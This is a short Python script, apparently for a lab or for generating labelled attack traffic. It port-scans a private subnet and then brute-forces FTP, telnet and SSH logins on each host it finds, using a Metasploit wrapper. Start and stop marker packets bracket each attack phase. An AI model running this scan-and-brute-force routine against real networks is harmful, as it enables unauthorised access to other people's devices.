from scanner import Scanner
from packet import send_packet
from metasploit import Metasploit

scanner = Scanner(initial_scan=False)
send_packet("portscan", "192.168.12.1", "start")
scanner.search_hosts()
send_packet("portscan", "192.168.12.1", "stop")

connected_ips = [host.ip for host in scanner.hosts]
print(f"Found connected devices with this ip addresses: {connected_ips}")

metasploit = Metasploit()
for connected_ip in connected_ips:
    send_packet("ftp_wordlist", connected_ip, "start")
    metasploit.brute_force_login(connected_ip, 'ftp')
    send_packet("ftp_wordlist", connected_ip, "stop")

    send_packet("telnet_wordlist", connected_ip, "start")
    metasploit.brute_force_login(connected_ip, 'telnet')
    send_packet("telnet_wordlist", connected_ip, "stop")

    send_packet("ssh_wordlist", connected_ip, "start")
    metasploit.brute_force_login(connected_ip, 'ssh')
    send_packet("ssh_wordlist", connected_ip, "stop")
